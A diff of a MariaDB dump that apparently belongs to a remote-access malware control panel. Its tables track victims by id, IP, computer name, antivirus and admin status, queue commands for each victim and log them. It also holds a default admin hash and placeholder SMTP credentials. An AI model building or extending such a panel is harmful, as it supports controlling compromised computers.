@@ -3,8 +3,8 @@
 -- https://www.phpmyadmin.net/
 --
 -- Host: 127.0.0.1
--- Generation Time: Dec 16, 2019 at 12:23 AM
--- Server version: 10.4.6-MariaDB
+-- Generation Time: 13 يناير 2020 الساعة 19:29
+-- إصدار الخادم: 10.4.6-MariaDB
 -- PHP Version: 7.2.22
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
@@ -25,57 +25,46 @@ SET time_zone = "+00:00";
 -- --------------------------------------------------------
 
 --
--- Table structure for table `admin`
+-- بنية الجدول `admin`
 --
 
 CREATE TABLE `admin` (
   `id` int(11) UNSIGNED NOT NULL,
   `username` text NOT NULL,
-  `password` mediumtext NOT NULL,
+  `password` text NOT NULL,
   `email` text NOT NULL,
   `role` text NOT NULL,
-  `s2fa` tinytext NOT NULL,
+  `s2fa` varchar(10) NOT NULL,
+  `secret` varchar(100) NOT NULL,
   `sqenable` varchar(10) NOT NULL,
   `question` text NOT NULL,
   `answer` text NOT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 --
--- Dumping data for table `admin`
+-- إرجاع أو استيراد بيانات الجدول `admin`
 --
 
-INSERT INTO `admin` (`id`, `username`, `password`, `email`, `role`, `s2fa`, `sqenable`, `question`, `answer`) VALUES
-(1, 'admin', '63cd16726f1b56ef120d5c1ddffaed3e3d472af6dabc5914a93b55cf30ca284d', 'localhost@gmail.com', 'administrator', 'off', 'off', 'Select a Security Question', '');
+INSERT INTO `admin` (`id`, `username`, `password`, `email`, `role`, `s2fa`, `secret`, `sqenable`, `question`, `answer`) VALUES
+(1, 'admin', '63cd16726f1b56ef120d5c1ddffaed3e3d472af6dabc5914a93b55cf30ca284d', 'localhost@gmail.com', 'administrator', 'off', 'null', 'off', 'Select a Security Question', '');
 
 -- --------------------------------------------------------
 
 --
--- Table structure for table `auth`
---
-
-CREATE TABLE `auth` (
-  `id` int(11) NOT NULL,
-  `username` mediumtext NOT NULL,
-  `code` mediumtext NOT NULL,
-  `secret` mediumtext NOT NULL,
-  `created_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
-
--- --------------------------------------------------------
-
---
--- Table structure for table `clients`
+-- بنية الجدول `clients`
 --
 
 CREATE TABLE `clients` (
   `id` int(11) UNSIGNED NOT NULL,
-  `vicid` mediumtext NOT NULL,
-  `ipaddress` longtext NOT NULL,
-  `computername` mediumtext NOT NULL,
-  `country` mediumtext NOT NULL,
-  `os` mediumtext NOT NULL,
-  `insdate` mediumtext NOT NULL,
-  `antivirus` mediumtext NOT NULL,
+  `vicid` text NOT NULL,
+  `ipaddress` text NOT NULL,
+  `computername` text NOT NULL,
+  `country` text NOT NULL,
+  `os` text NOT NULL,
+  `insdate` text NOT NULL,
+  `update_at` text NOT NULL,
+  `pings` int(11) NOT NULL,
+  `antivirus` text NOT NULL,
   `status` text NOT NULL,
   `is_usb` varchar(5) NOT NULL,
   `is_admin` tinytext NOT NULL
@@ -84,19 +73,19 @@ CREATE TABLE `clients` (
 -- --------------------------------------------------------
 
 --
--- Table structure for table `commands`
+-- بنية الجدول `commands`
 --
 
 CREATE TABLE `commands` (
   `id` int(11) NOT NULL,
-  `vicid` mediumtext NOT NULL,
+  `vicid` text NOT NULL,
   `command` mediumtext NOT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 -- --------------------------------------------------------
 
 --
--- Table structure for table `confirm_code`
+-- بنية الجدول `confirm_code`
 --
 
 CREATE TABLE `confirm_code` (
@@ -109,7 +98,21 @@ CREATE TABLE `confirm_code` (
 -- --------------------------------------------------------
 
 --
--- Table structure for table `settings`
+-- بنية الجدول `logs`
+--
+
+CREATE TABLE `logs` (
+  `id` int(11) NOT NULL,
+  `time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
+  `vicid` text NOT NULL,
+  `type` text NOT NULL,
+  `message` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+-- --------------------------------------------------------
+
+--
+-- بنية الجدول `settings`
 --
 
 CREATE TABLE `settings` (
@@ -121,7 +124,7 @@ CREATE TABLE `settings` (
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 --
--- Dumping data for table `settings`
+-- إرجاع أو استيراد بيانات الجدول `settings`
 --
 
 INSERT INTO `settings` (`id`, `recaptchaprivate`, `recaptchapublic`, `recaptchastatus`, `panel_status`) VALUES
@@ -130,7 +133,7 @@ INSERT INTO `settings` (`id`, `recaptchaprivate`, `recaptchapublic`, `recaptchas
 -- --------------------------------------------------------
 
 --
--- Table structure for table `smtp`
+-- بنية الجدول `smtp`
 --
 
 CREATE TABLE `smtp` (
@@ -144,11 +147,11 @@ CREATE TABLE `smtp` (
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 --
--- Dumping data for table `smtp`
+-- إرجاع أو استيراد بيانات الجدول `smtp`
 --
 
 INSERT INTO `smtp` (`id`, `smtphost`, `smtpuser`, `smtppassword`, `port`, `security_type`, `status`) VALUES
-(1, 'smtp.localhost.com', 'localhost@localhost.com', 'bG9jYWxob3N0', 587, 'none', 'off');
+(1, 'smtp.localhost.com', 'localhost@gmail.com', 'Z21haWxwYXNzd29yZA==', 0, 'none', 'off');
 
 --
 -- Indexes for dumped tables
@@ -158,12 +161,6 @@ INSERT INTO `smtp` (`id`, `smtphost`, `smtpuser`, `smtppassword`, `port`, `secur
 -- Indexes for table `admin`
 --
 ALTER TABLE `admin`
-  ADD PRIMARY KEY (`id`);
-
---
--- Indexes for table `auth`
---
-ALTER TABLE `auth`
   ADD PRIMARY KEY (`id`);
 
 --
@@ -182,6 +179,12 @@ ALTER TABLE `commands`
 -- Indexes for table `confirm_code`
 --
 ALTER TABLE `confirm_code`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Indexes for table `logs`
+--
+ALTER TABLE `logs`
   ADD PRIMARY KEY (`id`);
 
 --
@@ -207,12 +210,6 @@ ALTER TABLE `admin`
   MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
 
 --
--- AUTO_INCREMENT for table `auth`
---
-ALTER TABLE `auth`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
-
---
 -- AUTO_INCREMENT for table `clients`
 --
 ALTER TABLE `clients`
@@ -228,6 +225,12 @@ ALTER TABLE `commands`
 -- AUTO_INCREMENT for table `confirm_code`
 --
 ALTER TABLE `confirm_code`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+--
+-- AUTO_INCREMENT for table `logs`
+--
+ALTER TABLE `logs`
   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 
 --
